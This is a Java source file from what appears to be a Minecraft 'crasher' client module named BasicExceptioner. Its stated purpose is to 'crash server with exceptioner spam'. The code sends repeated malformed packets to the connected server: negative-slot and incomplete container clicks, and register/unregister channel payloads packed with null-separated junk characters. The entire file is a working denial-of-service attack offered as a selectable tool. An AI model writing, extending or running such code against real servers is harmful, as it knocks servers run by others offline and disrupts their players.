package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.network.protocol.common.ServerboundCustomPayloadPacket;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;

import java.util.ArrayList;
import java.util.List;

public class BasicExceptioner extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String mode = "Negative Click (1.8)";
    private int ppt = 5;
    private String channel = "register";
    private int channels = 500;

    public BasicExceptioner() {
        super("BasicExceptioner", "Crash server with exceptioner spam", true);
    }

    @Override
    public String getArgsUsage() { return "<mode> <ppt>"; }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"Negative Click (1.8)", "Incomplete packet (PE)", "(un)register"}));
        options.add(new OptionUtil("PPT", OptionType.INTEGER, new String[]{"5"}));
        options.add(new OptionUtil("Channel", OptionType.LIST, new String[]{"register", "unregister"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
        if (values.length > 1) {
            try { this.ppt = Integer.parseInt(values[1]); } catch (Exception ignored) {}
        }
        if (values.length > 2) this.channel = values[2];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null) {
            msgHelper.sendMessage("&cNot connected!", true);
            return;
        }

        switch (mode) {
            case "Negative Click (1.8)" -> {
                for (int i = 0; i < ppt; i++) {
                    ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                        0, 0, -999, 0, ClickType.PICKUP, new ItemStack(Items.AIR),
                        new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
                    );
                    mc.getConnection().send(packet);
                }
                msgHelper.sendMessage("&aNegative Click sent!", true);
            }
            case "Incomplete packet (PE)" -> {
                for (int i = 0; i < ppt; i++) {
                    ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                        0, 0, 0, 0, ClickType.PICKUP, new ItemStack(Items.AIR),
                        new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
                    );
                    mc.getConnection().send(packet);
                }
                msgHelper.sendMessage("&aIncomplete packet sent!", true);
            }
            case "(un)register" -> {
                StringBuilder sb = new StringBuilder();
                boolean unregister = channel.equals("unregister");
                for (int i = 0; i < (unregister ? channels : 129); i++) {
                    sb.append(unregister ? '0' : (char) i).append('\0');
                }
                sb.append("000");

                io.netty.buffer.ByteBuf buf = io.netty.buffer.Unpooled.buffer();
                FriendlyByteBuf friendlyBuf = new FriendlyByteBuf(buf);
                friendlyBuf.writeUtf("minecraft:" + channel);
                friendlyBuf.writeBytes(sb.toString().getBytes());

                for (int i = 0; i < ppt; i++) {
                    mc.getConnection().send(new ServerboundCustomPayloadPacket(
                        new net.minecraft.resources.ResourceLocation("minecraft:" + channel), friendlyBuf
                    ));
                }
                msgHelper.sendMessage("&a(Un)register sent!", true);
            }
        }
        setEnabled(false);
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
